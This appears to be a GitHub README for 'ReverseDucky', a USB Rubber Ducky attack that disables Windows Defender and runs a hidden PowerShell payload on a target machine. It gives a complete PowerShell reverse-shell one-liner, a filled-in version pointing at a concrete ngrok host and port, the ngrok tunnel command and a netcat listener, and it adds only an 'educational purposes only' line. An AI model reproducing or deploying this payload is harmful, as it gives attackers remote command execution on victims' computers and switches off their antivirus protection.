# ReverseDucky - Hahahaha quack quack!

Requirements
```
[x] USB Rubber Ducky

Payload: https://raw.githubusercontent.com/mkdirlove/ReverseDucky/main/payload.txt

Payload Generator: https://payloadstudio.com/community/

Ngrok: https://ngrok.com/download

Netcat: usually pre-installed in Linux distros like Kali Linux.
```

Start tunneling...
```
ngrok tcp 1337
```

Sample ngrok output...
```
K8s Gateway API support available now: https://ngrok.com/r/k8sgb

Session Status                online
Account                       mkdirlove (Plan: Free)
Version                       3.8.0
Region                        Asia Pacific (ap)
Latency                       31ms
Web Interface                 http://127.0.0.1:4040
Forwarding                    tcp://0.tcp.ap.ngrok.io:16038 -> localhost:1337

Connections                   ttl     opn     rt1     rt5     p50     p90
                              11      0       0.00    0.00    33.52   223.30 
```
After running ngrok you will notice the value of "Forwarding". Edit the payload below and replace NGROK_IP AND NGROK_PORT with the data from the value of "Forwarding".

```
$client = New-Object System.Net.Sockets.TCPClient("{NGROK_IP}",{NGROK_PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Example:
```
$client = New-Object System.Net.Sockets.TCPClient("0.tcp.ap.ngrok.io",16038);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Open new terminal and run netcat listener and wait for a reverse connection from port 1337
```
nc -lvnp 1337
```

After plugging the USB Rubber Ducky on the target machine it will automatically disable the Windows Defender and open a hidden Powershell that will download the payload and execute it in the background.

```
This information is for educational purposes only.

~MR.$UD0
```
